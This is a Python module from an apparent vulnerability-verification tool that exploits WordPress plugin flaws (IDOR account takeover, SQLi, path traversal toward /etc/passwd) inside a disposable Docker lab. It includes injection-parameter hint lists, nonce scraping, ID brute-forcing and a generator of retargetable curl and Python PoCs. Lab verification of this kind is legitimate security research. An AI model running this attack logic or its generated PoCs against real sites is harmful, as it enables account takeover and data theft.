"""Dynamic verifier: spins up a REAL, throwaway WordPress + MySQL in Docker, installs the fetched
plugin, and attempts the account-takeover an "missing-authorization"/"idor" hypothesis describes —
log in as the low-privilege user, send the crafted request against an admin account, and confirm by
actually logging in again with the new password. This is the live counterpart to the static PoC
webexploit.py builds and the source grounding websource.py does: everything up to here (classify,
fetch, grep, build PoC) is static; this module is the one piece that RUNS something, so it is kept
separate, Docker-gated, and torn down unconditionally.

Scope (deliberately narrow, matching binoracle's "no false positives" rule — broaden per-class over
time rather than claim more than this can prove): this verifies ONE concrete shape — a WordPress
plugin where an authenticated low-privilege user can change ANOTHER user's email/password because
the handler trusts a user-id parameter from the request instead of checking it against the session.
That is exactly the CVE-2026-5523 shape this was built against. It does not attempt SQLi/XSS/RCE/...
dynamically; those need different confirmation harnesses (see the module docstring's TODO list) and
are future work, not simulated here.

Honesty: `verified` is set to True ONLY when a SECOND, independent login — as the admin account,
with the password THIS run's crafted request set — succeeds against the live WordPress instance.
That is unambiguous proof of account takeover, not a 200 status code or a guess. Everything else
(fetch, plugin install, first login, the crafted request itself) is logged as evidence either way.

Requires a reachable Docker DAEMON (not just the `docker` CLI) — checked explicitly, since the CLI
can be installed with no daemon running (degrades honestly, NOT_APPLICABLE, same pattern as
autosrop_aarch64.py for a missing cross toolchain). Pulls wordpress/mysql/alpine images on first use
(internet needed for that one-time cost, same as `make pwn-image`); the WordPress instance runs on
an isolated per-run Docker network/volume and is always torn down. Its HTTP port is published on a
random high port on all interfaces (see start_wordpress()/_lab_host(): binoracle normally drives
the HOST's daemon through a mounted socket, so a 127.0.0.1-only bind would be unreachable from
binoracle's own container), scoped down by being ephemeral, randomly-ported, and torn down on every
exit — not by network isolation, so only run this against trusted hosts/networks.
"""
from __future__ import annotations

import io
import json
import hashlib
import os
import re
import secrets
import shutil
import socket
import subprocess
import tarfile
import time
import urllib.parse
import zipfile
from dataclasses import dataclass, field
from typing import Callable, List, Optional

from binoracle.workflows.engine import SourceCodeIntelligence as _SCI

# requests no siempre esta en el sys.path cuando el usuario invoca con el Python del sistema en
# lugar del venv (ej. `python3 -m binoracle.cli` sin activar). Lo importamos aqui para que el
# error falle rapido y en un lugar visible, con un mensaje util. Si falla, intenta el site-packages
# del venv que esta junto al ejecutable actual (detecta tanto `python3` del sistema como el venv).
try:
    import requests as _requests_check; del _requests_check  # noqa: E702 — solo para verificar
except ImportError:
    import sys as _sys, pathlib as _pathlib
    # El venv esta junto al paquete binoracle (desktop/binoracle/.venv), no junto al ejecutable.
    # Busca hacia arriba desde este fichero hasta encontrar un .venv con site-packages.
    _pkg_root = _pathlib.Path(__file__).parent
    _found = False
    for _ in range(5):  # max 5 niveles
        _pkg_root = _pkg_root.parent
        for _sp in sorted(_pkg_root.glob(".venv/lib/python*/site-packages")):
            if str(_sp) not in _sys.path:
                _sys.path.insert(0, str(_sp))
                _found = True
                break
        if _found:
            break
    del _pkg_root, _found

_MYSQL_IMAGE = "mysql:8.0"
# Overridable: confirmed live investigating CVE-2024-1071 (Ultimate Member SQLi) that the
# vulnerable code's `in_array($sortby, $custom_sort)` / loose `==` comparisons are PHP-version
# sensitive (PHP 8's stricter comparison semantics vs PHP 7.x's looser type juggling) -- a lab
# pinned to one PHP version can give a false negative for a CVE whose original PoC environment
# ran an older PHP. BINORACLE_WP_IMAGE lets the analyst pin a specific official `wordpress`
# Docker Hub tag (e.g. wordpress:php7.4-apache) to match the CVE's real-world era/environment
# instead of always using the current default.
_WP_IMAGE = os.environ.get("BINORACLE_WP_IMAGE", "wordpress:php8.2-apache")
_WPCLI_IMAGE = "wordpress:cli"
_ALPINE_IMAGE = "alpine:3.20"

_ID_HINTS = ("user_id", "uid", "id", "target", "target_id", "user")
_EMAIL_HINTS = ("email", "mail", "user_email")
_PASS_HINTS = ("pass", "password", "pwd", "user_pass")
_PATH_HINTS = (
    "file", "path", "page", "template", "include", "doc", "filename", "tpl", "view",
    # nombres adicionales comunes en plugins que usan LFI (source=Chartify, src, data, name, fname,
    # filepath, dir, f, p, t -- cubre la mayoria de plugins RandomRobbieBF con LFI no-estandar)
    "source", "src", "data", "name", "fname", "filepath", "dir", "f", "p", "t",
    "load", "read", "fetch", "get", "open", "import", "url", "location",
    "tab", "action", "module", "section", "panel",
)
# firma inequivoca de la primera linea de /etc/passwd en cualquier Linux (root, uid/gid 0) --
# usada como fallback de path-traversal cuando el canario propio no se confirma (ver
# verify_wordpress_path_traversal): a diferencia del canario (en /tmp, plantado por nosotros),
# /etc/passwd ya existe siempre, con 0644 legible por cualquier usuario, y es el objetivo EXACTO
# que demuestra el PoC publico ya divulgado de CVE-2024-50508 y de la mayoria de CVEs de este
# tipo -- si esto se confirma y el canario no, aisla el problema a algo especifico del canario.
_PASSWD_SIGNATURE_RE = re.compile(r"root:[^:\n]*:0:0:")
_CMD_HINTS = ("cmd", "command", "exec", "host", "ip", "ping", "target", "query", "addr",
             "domain", "shell")
_PHP_CODE_HINTS = ("queryargs", "query_args", "code", "php", "eval", "script", "source",
                   "payload", "querytype", "query_type", "args", "data")
_SQLI_HINTS = ("sort", "order", "id", "search", "email", "sender", "receiver",
               "q", "query", "code", "name", "term", "filter",
               # ORDER BY injection params (CVE-2024-1071 sorting param, common WP plugin pattern)
               "sorting", "orderby", "order_by", "sort_by", "sortby", "ordertype",
               "order_type", "sort_dir", "direction", "field", "column", "colname",
               # additional common WP plugin param names for SQLi
               "category", "cat", "tag", "post_id", "user_id", "meta_key", "meta_value",
               "taxonomy", "parent", "status", "type", "subtype", "action", "task",
               "directory_id", "member_directory", "listing_id", "event_id", "form_id")

# algunos plugins NO crean sus paginas por defecto (Login/Register/Account/Members/...) con la
# simple activacion -- exigen un paso extra PROPIO de cada plugin (un boton "Create Pages" en su
# aviso de admin, o una URL de un solo uso), que `wp plugin activate` por si solo nunca dispara.
# Confirmado por la documentacion oficial del plugin, no adivinado: Ultimate Member necesita
# visitar 'wp-admin/admin.php?page=um_options&um_adm_action=install_core_pages' como admin para
# crear sus paginas (Register/Account/Members/...) -- sin esto, NINGUNA pagina del sitio las
# muestra, y no hay nonce que rascar en ningun lado para su AJAX, lo que parecia (pero no era)
# un bloqueo de infraestructura distinto -- confirmado en vivo, CVE-2024-1071. No existe una
# convencion generica de WordPress para esto (cada plugin inventa su propio mecanismo), asi que
# este registro se amplia caso por caso -- igual que shortcode_name/relationship_table ya lo
# hacen para otros CVEs (ver _bootstrap_lab).
_PLUGIN_SETUP_TRIGGER_PATHS: dict = {}  # now auto-detected via _detect_setup_trigger_from_source()
# Mismo patron, otro bloqueo distinto -- confirmado en vivo, CVE-2024-1071: el shortcode pegado
# en una pagina generica (ver shortcode_page_path en _bootstrap_lab) basta para MUCHOS plugins,
# pero Ultimate Member guarda la configuracion real del "Member Directory" (incluido el campo de
# ordenacion personalizado que el sumidero vulnerable de verdad usa) como su PROPIO custom post
# type (`um_directory`), no como meta de una pagina generica -- sin un post real de este tipo, la
# resolucion por fuerza bruta de `directory_id` (md5(str(n))[10:15] para n=1..99, exactamente el
# mismo patron que usa el exploit publico de gbrsh/CVE-2024-1071) nunca encuentra nada valido, y
# CADA peticion se rechaza antes de llegar siquiera al codigo vulnerable -- 380 intentos reales
# de las 5 tecnicas de inyeccion devolvieron consistentemente la misma respuesta de control sin
# una sola senal, no porque las tecnicas fallaran, sino porque ninguna llegaba a disparar el
# sumidero real. slug -> post_type de "directorio/listado" propio del plugin a crear ademas de
# la pagina del shortcode.
# Formerly hardcoded lookup tables — now empty. CPT and shortcode are detected dynamically
# from the installed plugin source via _detect_directory_cpt_from_source() and
# _detect_directory_shortcode_from_source(). Left as empty dicts so callers that still
# reference them (e.g. _auto_resolve_wp_blockers's legacy fallback) don't get NameErrors.
_PLUGIN_DIRECTORY_CPT: dict = {}
_PLUGIN_SHORTCODE_OVERRIDE: dict = {}

# Plugin-specific WP options that must be force-enabled in the lab to reach the vulnerable
# code path, regardless of the auto-detect scan (used when the scan finds >3 options and
# aborts, or when the option is not near the injection sink in source).
# Format: {slug: {option_key: value, ...}}
# Values are raw PHP strings (e.g. "1", "'custom'"); they go into update_option() directly.
_PLUGIN_REQUIRED_OPTIONS: dict = {}  # now auto-detected via boolean-gate filter in _bootstrap_lab
_URL_HINTS = ("url", "uri", "src", "source", "link", "feed", "webhook", "callback",
             "image", "avatar", "file_url", "endpoint")
_XSS_HINTS = ("comment", "content", "message", "title", "name", "bio", "description", "text",
             "value", "q", "search", "body",
             "template", "tpl", "render", "expr", "input", "tmpl")
_XML_HINTS = ("xml", "feed", "data", "content", "body", "payload", "import")
_REDIRECT_HINTS = ("redirect", "url", "return", "next", "target", "dest", "destination",
                   "continue", "go", "out", "location")
_FILE_UPLOAD_HINTS = (
    "file", "upload", "avatar", "image", "attachment", "document", "photo",
    "files", "media", "content", "data", "import", "thumbnail", "logo",
    "async-upload", "mfile", "userfile", "uploadfile", "file_upload",
    "upload_file", "img", "picture", "icon", "cover", "banner",
)
# Suffixes that signal the BINARY upload field vs the filename/path hint field
# e.g. "file_url" > "file_name" — checked after the basic hints
_UPLOAD_BINARY_SUFFIXES  = ("_url", "_content", "_data", "_binary", "_body", "_stream")
_UPLOAD_NAME_SUFFIXES    = ("_name", "_filename", "_path")
_SERIAL_HINTS = ("data", "payload", "value", "options", "settings", "meta", "object", "serialized")
# HTTP headers commonly used as injection points (SQLi, SSTI, log-injection)
_HEADER_INJECTION_HINTS = (
    "X-Forwarded-For", "X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL",
    "X-Custom-IP-Authorization", "X-Remote-IP", "X-Client-IP",
    "User-Agent", "Referer", "Cookie",
    "X-Api-Version", "X-Auth-Token", "Authorization",
)


@dataclass
class WpVerifyResult:
    ok: bool = False                 # el flujo corrio hasta el final sin errores de infraestructura
    available: bool = True           # False si ni se pudo intentar (sin Docker daemon, etc.)
    verified: bool = False           # SOLO True si el segundo login con la nueva password funciono
    detail: str = ""
    logs: List[str] = field(default_factory=list)
    limitations: List[str] = field(default_factory=list)
    # evidencia REAL y concreta de la ejecucion contra el laboratorio efimero (no plantilla, no
    # placeholders): el payload exacto enviado, el admin_id real del laboratorio, el codigo de
    # respuesta real, y la password/email reales que el ataque fijo y que el segundo login
    # confirmo que funcionaban. Son datos de un WordPress desechable que ya no existe cuando el
    # analista los lee -- no filtran nada de ningun objetivo real, y sirven como prueba dura de que
    # el flujo se ejecuto de verdad, no que se simulo.
    evidence: dict = field(default_factory=dict)
    # traza estructurada de cada técnica que falló: [{attempt_n, technique, endpoint, param,
    # causa, detail, diff_bytes}] — permite al motor y al analista saber EXACTAMENTE por qué
    # falló cada intento sin relanzar el ataque a mano.
    failure_trace: list = field(default_factory=list)
    # PoC listo para copiar-pegar generado tras verified=True: {curl, python, http, description}
    exploit_poc: dict = field(default_factory=dict)
    # Timestamps y hashes de evidencia — integridad forense
    # started_at / finished_at: epoch float del inicio/fin de la verificacion
    # evidence_hashes: {nombre → sha256_hex} de respuestas HTTP y ficheros de canario capturados
    started_at: float = field(default_factory=lambda: __import__("time").time())
    finished_at: float = 0.0
    evidence_hashes: dict = field(default_factory=dict)
    # Nivel de confianza: confirmed | probable | inconclusive | not_reproducible | none
    # confirmed  → técnica dura (error-based, UNION, canary confirmado, password reset verificado)
    # probable   → técnica blanda (time-based, boolean-blind, content-diff) con señal consistente
    # inconclusive → lab OK pero ninguna técnica produjo diferencial; no descarta la vuln
    # not_reproducible → lab no arrancó o build falló
    # none       → no se ha intentado nada (valor inicial)
    confidence: str = "none"


def _auto_set_confidence(res: "WpVerifyResult") -> None:
    """Sets res.confidence if still 'none', based on verified status and technique.
    Also stamps finished_at and hashes key evidence fields (idempotent)."""
    _stamp_result(res)
    if res.confidence != "none":
        return
    if not res.available:
        res.confidence = "not_reproducible"
        return
    if not res.verified:
        res.confidence = "inconclusive"
        return
    # confirmed techniques: strong, deterministic evidence
    _CONFIRMED_TECHS = {
        "error-based", "union-based", "order-by-context-error-based",
        "command-injection", "path-traversal", "lfi-rce", "canary",
        "confirm-string", "password-reset", "xss-confirmed", "ssti-confirmed",
        "nosql-injection", "xxe", "graphql-bypass", "header-bypass",
        "cors-misconfig", "csrf", "crlf-injection",
    }
    _PROBABLE_TECHS = {
        "boolean-blind-differential", "boolean-blind-content-diff", "time-based-blind",
        "order-by-context-time-based", "boolean-oracle", "ssrf-callback",
        "open-redirect", "jwt-bypass", "prototype-pollution",
        "race-condition", "idor",
    }
    tech = res.evidence.get("tecnica", "")
    if any(t in tech for t in _CONFIRMED_TECHS):
        res.confidence = "confirmed"
    elif any(t in tech for t in _PROBABLE_TECHS):
        res.confidence = "probable"
    else:
        res.confidence = "confirmed"  # default for verified without explicit technique


def _hash_evidence(data: str) -> str:
    """SHA-256 of a string (truncated to 16 hex chars for compactness)."""
    import hashlib
    return hashlib.sha256(data.encode("utf-8", errors="replace")).hexdigest()[:16]


def _stamp_result(res: "WpVerifyResult") -> None:
    """Record finished_at and hash key evidence fields."""
    res.finished_at = time.time()
    for key in ("respuesta_cuerpo_recorte", "respuesta_control_recorte", "canary_secret",
                "payload_ganador", "mysql_version_extraida"):
        val = res.evidence.get(key)
        if val:
            res.evidence_hashes[key] = _hash_evidence(str(val))


def _run(cmd: List[str], timeout: float = 60.0, input_text: str = None) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, input=input_text)


def _docker_daemon_ok(timeout: float = 8.0) -> bool:
    """A mano de _docker_image_ok en _sandbox.py: el binario `docker` puede existir sin que el
    DAEMON este arriba (exactamente lo que pasa en este propio sandbox de desarrollo), asi que se
    comprueba de verdad con un comando real y acotado, nunca solo shutil.which."""
    if not shutil.which("docker"):
        return False
    try:
        return _run(["docker", "info"], timeout=timeout).returncode == 0
    except subprocess.TimeoutExpired:
        return False
    except Exception:
        return False


def _detect_lfi_param_from_source(plugin_source_dir: str) -> Optional[str]:
    """Scan PHP source for the first user-controlled parameter passed to a file-read sink.

    Returns the HTTP param name (e.g. 'source', 'file', 'path') or None if not found.
    Used as a last resort when _PATH_HINTS and the LLM params list don't identify
    the vulnerable parameter — covers non-standard names like sogrid, wp-umbrella.

    Two-pass taint analysis:
    Pass 1 — direct: $_GET['param'] appears inline in a file-read sink call.
    Pass 2 — indirect: $var = $_GET['param'] assigned anywhere in the same file,
              then $var (or a concatenation containing it) appears in a file-read sink.
    """
    import glob as _glf, re as _relf
    _SINKS_RE = _relf.compile(
        r"""(?:file_get_contents|readfile|file|fopen|include|require|
            include_once|require_once|highlight_file|show_source|
            file_exists|is_file|is_readable)\s*\(\s*
            (?:sanitize_file_name\s*\(\s*|wp_unslash\s*\(\s*|esc_attr\s*\(\s*)?
            (?:\$_(?:GET|POST|REQUEST|FILES)\[['"]([a-zA-Z0-9_\-]+)['"]\]|
               intval\s*\(\s*\$_(?:GET|POST|REQUEST)\[['"]([a-zA-Z0-9_\-]+)['"]\]\))""",
        _relf.VERBOSE | _relf.IGNORECASE)
    # Matches: $var = $_GET['param'] or $var = sanitize_*(esc_*($_REQUEST['param']))
    _ASSIGN_RE = _relf.compile(
        r'\$([a-zA-Z_]\w*)\s*=\s*(?:[\w_]+\s*\(\s*)*\$_(?:GET|POST|REQUEST)\s*\[\s*'
        r"['\"]([a-zA-Z0-9_\-]+)['\"]\s*\]",
        _relf.IGNORECASE)
    # Matches a file-read sink with a PHP variable argument (possibly in concatenation)
    _SINK_VAR_RE = _relf.compile(
        r"""(?:file_get_contents|readfile|file|fopen|include|require|
            include_once|require_once|highlight_file|show_source)\s*\(
            [^)]*\$([a-zA-Z_]\w*)""",
        _relf.VERBOSE | _relf.IGNORECASE)
    for _f in _glf.glob(str(plugin_source_dir) + "/**/*.php", recursive=True):
        try:
            _src = open(_f, encoding="utf-8", errors="replace").read(100_000)
        except OSError:
            continue
        # Pass 1: direct inline taint
        for _m in _SINKS_RE.finditer(_src):
            _param = _m.group(1) or _m.group(2)
            if _param:
                return _param
        # Pass 2: local variable taint (same file)
        _var_to_param: dict = {}
        for _ma in _ASSIGN_RE.finditer(_src):
            _vname, _pname = _ma.group(1), _ma.group(2)
            if _vname not in _var_to_param:
                _var_to_param[_vname] = _pname
        if _var_to_param:
            for _ms in _SINK_VAR_RE.finditer(_src):
                _used_var = _ms.group(1)
                if _used_var in _var_to_param:
                    return _var_to_param[_used_var]
    return None


def _pick_param(params, hints) -> Optional[str]:
    """Elige el nombre de parametro mas probable para un rol (id/email/password) entre los que
    cito el LLM, por coincidencia de substring contra una lista de pistas ordenada por prioridad.

    Desempate para campos de subida de fichero: cuando varios params coinciden con la misma pista,
    prefiere el que termina en un sufijo binario (_url, _content, _data...) sobre el que termina
    en un sufijo de nombre (_name, _filename, _path), porque en muchos PoCs el campo binario se
    llama file_url y el campo de nombre se llama file_name -- y el motor necesita subir el
    contenido PHP al campo binario, no al de nombre.
    """
    if not params:
        return None
    names = list(params.keys()) if isinstance(params, dict) else list(params)
    low = {n: n.lower() for n in names}
    for h in hints:
        # Collect all params that match this hint
        matches = [n for n, l in low.items() if h in l]
        if not matches:
            continue
        if len(matches) == 1:
            return matches[0]
        # Prefer binary-upload suffix over name/path suffix
        binary = [n for n in matches if any(low[n].endswith(s) for s in _UPLOAD_BINARY_SUFFIXES)]
        if binary:
            return binary[0]
        # Avoid _name/_filename/_path params when better alternatives exist
        non_name = [n for n in matches if not any(low[n].endswith(s) for s in _UPLOAD_NAME_SUFFIXES)]
        return (non_name or matches)[0]
    return None


def _scan_rest_routes(plugin_source_dir: str) -> list:
    """Scan plugin PHP source for REST routes and WP Ajax hooks.

    Returns a list of candidate endpoint strings, e.g.:
      ['/wp-json/myplugin/v1/members', '/wp-json/myplugin/v1/search', ...]

    Covers:
    - register_rest_route('namespace', 'route') → /wp-json/namespace/route
    - add_action('wp_ajax_myaction', ...) → /wp-admin/admin-ajax.php?action=myaction
    - add_action('wp_ajax_nopriv_myaction', ...) → same, unauthenticated
    """
    import glob
    results = []
    if not plugin_source_dir:
        return results
    _ns_re = re.compile(
        r"register_rest_route\s*\(\s*['\"]([^'\"]+)['\"]\s*,\s*['\"]([^'\"]+)['\"]",
        re.I)
    _ajax_re = re.compile(
        r"add_action\s*\(\s*['\"]wp_ajax(?:_nopriv)?_([^'\"]+)['\"]",
        re.I)
    for php_file in glob.glob(str(plugin_source_dir) + "/**/*.php", recursive=True):
        try:
            content = open(php_file, encoding="utf-8", errors="replace").read(80_000)
        except OSError:
            continue
        for m in _ns_re.finditer(content):
            ns = m.group(1).strip("/")
            route = m.group(2).strip("/")
            # strip optional regex anchors from route: (?P<id>\d+) → {id}
            clean_route = re.sub(r"\(\?P<(\w+)>[^)]+\)", r"{\1}", route)
            ep = f"/wp-json/{ns}/{clean_route}"
            if ep not in results:
                results.append(ep)
        for m in _ajax_re.finditer(content):
            action = m.group(1)
            ep = f"/wp-admin/admin-ajax.php?action={action}"
            if ep not in results:
                results.append(ep)
    return results[:20]  # cap to avoid flooding step output


def _wp_run_request_chain(
    base_url: str,
    chain: list,
    admin_sess,
    sub_sess,
    anon_sess,
    step: "Callable",
) -> "tuple[bool, str, dict]":
    """Execute a multi-step request chain against a live WordPress lab.

    Each step dict supports:
      method, endpoint, body (JSON string or form dict), headers,
      auth (admin|subscriber|anon), extract ({var: 'json:path' | 'regex:...'}),
      confirm_string, confirm_status, is_final.
    Returns (verified, detail, evidence).

    Generic — works for any WP CVE that needs multi-step exploitation:
    1) login → 2) CSRF token harvest → 3) privileged action → 4) verify effect
    """
    vars_: dict = {}
    _sess_map = {"admin": admin_sess, "subscriber": sub_sess, "anon": anon_sess}

    def _sub(text: str) -> str:
        for k, v in vars_.items():
            text = text.replace("{{" + k + "}}", str(v))
        return text

    def _jp(obj, path: str):
        for part in path.split("."):
            if isinstance(obj, dict):
                obj = obj.get(part)
            else:
                return None
        return obj

    final_evidence: dict = {}
    for idx, sd in enumerate(chain):
        method = (sd.get("method") or "GET").upper()
        ep = _sub(sd.get("endpoint") or "/")
        url = base_url.rstrip("/") + ep
        hdrs: dict = {k: _sub(str(v)) for k, v in (sd.get("headers") or {}).items()}
        sess = _sess_map.get(sd.get("auth", "anon")) or anon_sess
        raw_body = sd.get("body") or ""
        body_data = None
        if method not in ("GET", "HEAD") and raw_body:
            if isinstance(raw_body, dict):
                body_data = {k: _sub(str(v)) for k, v in raw_body.items()}
                hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")
            else:
                try:
                    import json as _j
                    body_data = _j.dumps(_j.loads(_sub(raw_body)))
                    hdrs.setdefault("Content-Type", "application/json")
                except Exception:
                    body_data = _sub(raw_body)
        step(f"  wp-chain[{idx}]: {method} {ep} (auth={sd.get('auth','anon')})")
        try:
            r = sess.request(
                method, url,
                data=body_data if isinstance(body_data, (str, dict)) else None,
                json=body_data if isinstance(body_data, dict) and "json" in hdrs.get("Content-Type","") else None,
                params=({k: _sub(str(v)) for k, v in (sd.get("params") or {}).items()} or None),
                headers=hdrs,
                timeout=20,
                allow_redirects=True,
            )
        except Exception as exc:
            return False, f"wp-chain[{idx}] request error: {exc}", {}
        body_text = r.text or ""
        # Extract variables
        for var_name, expr in (sd.get("extract") or {}).items():
            if expr.startswith("json:"):
                try:
                    import json as _j2
                    val = _jp(_j2.loads(body_text), expr[5:])
                    if val is not None:
                        vars_[var_name] = val
                        step(f"  wp-chain[{idx}]: extracted {var_name}={str(val)[:40]}")
                except Exception:
                    pass
            elif expr.startswith("regex:"):
                try:
                    m2 = re.search(expr[6:], body_text)
                    if m2:
                        vars_[var_name] = m2.group(1) if m2.lastindex else m2.group(0)
                        step(f"  wp-chain[{idx}]: extracted {var_name}={vars_[var_name][:40]!r}")
                except Exception:
                    pass
            elif expr.startswith("nonce:"):
                # Auto-extract WordPress nonce from HTML
                nonces = _scrape_nonce_candidates(body_text)
                if nonces:
                    vars_[var_name] = nonces[0]
                    step(f"  wp-chain[{idx}]: nonce extracted → {vars_[var_name]}")
        # Status check
        expect_st = sd.get("confirm_status")
        if expect_st and r.status_code != expect_st:
            return False, f"wp-chain[{idx}] HTTP {r.status_code} != expected {expect_st}", {}
        is_final = sd.get("is_final", idx == len(chain) - 1)
        if is_final:
            final_evidence = {
                "status": r.status_code, "body_snippet": body_text[:400],
                "vars": {k: str(v)[:100] for k, v in vars_.items()},
                "endpoint": ep,
            }
            cs = sd.get("confirm_string", "")
            if cs:
                if cs in body_text:
                    return True, f"wp-chain VERIFICADO: '{cs}' en respuesta", final_evidence
                return False, f"wp-chain[{idx}] '{cs}' no encontrado — HTTP {r.status_code}", final_evidence
            return True, f"wp-chain[{idx}] HTTP {r.status_code} OK (sin confirm_string)", final_evidence
    return False, "request_chain vacío", {}


_NONCE_HTML_RE = re.compile(
    r'(?:nonce|security)["\']?\s*[:=]\s*["\']([a-f0-9]{8,16})["\']', re.I)
_WPNONCE_INPUT_RE = re.compile(
    r'name=["\']_?wpnonce[^"\']*["\'][^>]*value=["\']([a-f0-9]{8,16})["\']', re.I)
_WPNONCE_INPUT_RE2 = re.compile(
    r'value=["\']([a-f0-9]{8,16})["\'][^>]*name=["\']_?wpnonce[^"\']*["\']', re.I)


def _scrape_nonce_candidates(html: str) -> list:
    """Busca nonces de WordPress REALES embebidos en una pagina viva (inline JS vía
    wp_localize_script, p.ej. `"nonce":"abcd1234"`, o un campo oculto `_wpnonce`) -- un nonce de
    WP es siempre hexadecimal de 8-16 caracteres, generado por sesion/accion, nunca adivinable."""
    found = []
    for rx in (_NONCE_HTML_RE, _WPNONCE_INPUT_RE, _WPNONCE_INPUT_RE2):
        for m in rx.finditer(html or ""):
            v = m.group(1)
            if v not in found:
                found.append(v)
    return found


def _quick_causa(body: str, status: int) -> str:
    """Clasifica el motivo de fallo de un intento de lab en una palabra, sin duplicar
    la lógica completa de _diagnose_failure (que vive en cve_agent.py)."""
    if status == 404 or "404" in (body or "")[:80]:
        return "404"
    b = (body or "").lower()
    if any(t in b for t in ("invalid nonce", "wrong nonce", "invalid security",
                            "security check failed", "nonce_mismatch", "_wpnonce")):
        return "nonce"
    if status in (401, 403) or any(t in b for t in
                                   ("you must log in", "please log in", "forbidden",
                                    "acceso denegado", "login required")):
        return "auth"
    if b.strip() in ("{}", "[]", "", "null") or not b.strip():
        return "empty"
    if status == 500:
        return "error_500"
    return "unknown"


def _build_exploit_poc(
    base_url: str,
    endpoint: str,
    method: str,
    params: dict,
    headers: dict = None,
    technique: str = "",
    description: str = "",
    json_body: bool = False,
) -> dict:
    """Genera un PoC copy-paste (curl + Python requests + HTTP raw) a partir del request
    exacto que confirmó la vulnerabilidad en el lab. Reemplaza TARGET por la URL real del
    objetivo cuando se reutiliza fuera del lab."""
    import shlex as _shlex
    import json as _json

    # Detect URL_PATH mode: params = {"URL_PATH": "<traversal_payload>"}
    # In this mode the payload is appended to the endpoint path, not as a query param.
    _url_path_mode = (
        isinstance(params, dict)
        and len(params) == 1
        and list(params.keys())[0].upper() in ("URL_PATH", "URLPATH")
    )
    _url_path_value = list(params.values())[0] if _url_path_mode else ""

    import urllib.parse as _uparse
    _method = (method or "GET").upper()
    base_ep = base_url.rstrip("/") + "/" + endpoint.lstrip("/")
    if _url_path_mode:
        full_url = base_ep.rstrip("/") + "/" + _url_path_value.lstrip("/")
    elif _method not in ("POST", "PUT", "PATCH") and params:
        full_url = base_ep + "?" + _uparse.urlencode(params)
    else:
        full_url = base_ep
    hdr = dict(headers or {})
    m = _method

    # ── curl ────────────────────────────────────────────────────────────────
    curl_parts = ["curl", "-s", "-i"]
    if m in ("POST", "PUT", "PATCH"):
        curl_parts += ["-X", m]
        if json_body:
            curl_parts += ["-H", "Content-Type: application/json"]
            curl_parts += ["-d", _json.dumps(params)]
        else:
            for k, v in params.items():
                curl_parts += ["-d", f"{k}={v}"]
    elif not _url_path_mode:
        pass  # GET params handled via URL below
    for hk, hv in hdr.items():
        if hk.lower() not in ("content-type", "content-length"):
            curl_parts += ["-H", f"{hk}: {hv}"]
    curl_parts.append(_shlex.quote(full_url))
    curl_cmd = " ".join(
        p if p.startswith("-") or p == _shlex.quote(full_url) else _shlex.quote(p)
        for p in curl_parts
    )

    # ── Python requests ─────────────────────────────────────────────────────
    py_lines = ["import requests", "", f'TARGET = "{full_url}"', ""]
    if hdr:
        py_lines.append(f"headers = {_json.dumps(hdr, indent=4)}")
    else:
        py_lines.append("headers = {}")
    if m in ("POST", "PUT", "PATCH"):
        py_lines.append(f"data = {_json.dumps(params, indent=4)}")
        if json_body:
            py_lines.append(f'r = requests.{m.lower()}(TARGET, json=data, headers=headers, verify=False)')
        else:
            py_lines.append(f'r = requests.{m.lower()}(TARGET, data=data, headers=headers, verify=False)')
    elif _url_path_mode:
        # Payload already embedded in TARGET URL — simple GET with no extra params
        py_lines.append('r = requests.get(TARGET, headers=headers, verify=False)')
    else:
        py_lines.append(f"params = {_json.dumps(params, indent=4)}")
        py_lines.append('r = requests.get(TARGET, params=params, headers=headers, verify=False)')
    py_lines += ["print(r.status_code)", "print(r.text[:500])"]
    python_script = "\n".join(py_lines)

    # ── Raw HTTP ────────────────────────────────────────────────────────────
    path = endpoint if endpoint.startswith("/") else "/" + endpoint
    if m in ("POST", "PUT", "PATCH"):
        if json_body:
            body_str = _json.dumps(params)
            ct = "application/json"
        else:
            body_str = "&".join(f"{k}={v}" for k, v in params.items())
            ct = "application/x-www-form-urlencoded"
        http_lines = [
            f"{m} {path} HTTP/1.1",
            "Host: TARGET",
            f"Content-Type: {ct}",
            f"Content-Length: {len(body_str.encode())}",
            "",
            body_str,
        ]
    elif _url_path_mode:
        # Path traversal: payload is part of the URL path
        path_with_payload = path.rstrip("/") + "/" + _url_path_value.lstrip("/")
        http_lines = [f"GET {path_with_payload} HTTP/1.1", "Host: TARGET", ""]
    else:
        qs = "&".join(f"{k}={v}" for k, v in params.items())
        path_qs = f"{path}?{qs}" if qs else path
        http_lines = [f"GET {path_qs} HTTP/1.1", "Host: TARGET", ""]

    return {
        "curl": curl_cmd,
        "python": python_script,
        "http": "\n".join(http_lines),
        "description": description or f"{technique} confirmed on {endpoint}",
        "technique": technique,
    }


def _list_real_page_urls(lab, limit: int = 12) -> list:
    """Enumera las paginas REALES y ya publicadas del sitio (incluidas las que un plugin crea
    automaticamente al activarse -- confirmado en vivo, Ultimate Member/CVE-2024-1071: crea
    'Account'/'Members'/'Register'/'Login'/... en sus propias slugs, p.ej. '/index.php/register/'
    -- que el exploit publico real scrapea para sacar el nonce, NO la portada por defecto, que no
    tiene nada del plugin). Generico: no asume el slug/shortcode concreto de ningun plugin, solo
    pregunta a WordPress que paginas existen de verdad. Best-effort -- sin wp-cli disponible o sin
    ninguna pagina, devuelve lista vacia (el llamador sigue con lo que ya tenga, p.ej. la portada)."""
    try:
        r = lab.wp_cli("post", "list", "--post_type=page", "--post_status=publish",
                       "--field=url", "--format=csv", timeout=20)
        urls = [u.strip() for u in (r.stdout or "").splitlines() if u.strip()]
        return urls[:limit]
    except Exception:
        return []


def _discover_hashed_resource_id(probe: Callable[[str], bool], max_n: int = 100) -> Optional[str]:
    """Algunos plugins no usan IDs de recurso numericos planos sino un hash truncado de un
    contador secuencial pequeno (ofuscacion, no seguridad real) -- confirmado en vivo, Ultimate
    Member/CVE-2024-1071: su 'directory_id' real es `md5(str(n))[10:15]` para un n pequeno (el
    exploit publico de gbrsh lo prueba exactamente asi, n=1..100). `probe(candidato)` debe
    devolver True si ESE candidato fue ACEPTADO por el servidor (p.ej. la respuesta de control
    marca exito, no un error de validacion) -- devuelve el primero aceptado, o None si ninguno de
    los `max_n` candidatos lo fue."""
    for n in range(1, max_n + 1):
        cand = hashlib.md5(str(n).encode()).hexdigest()[10:15]
        try:
            if probe(cand):
                return cand
        except Exception:
            continue
    return None


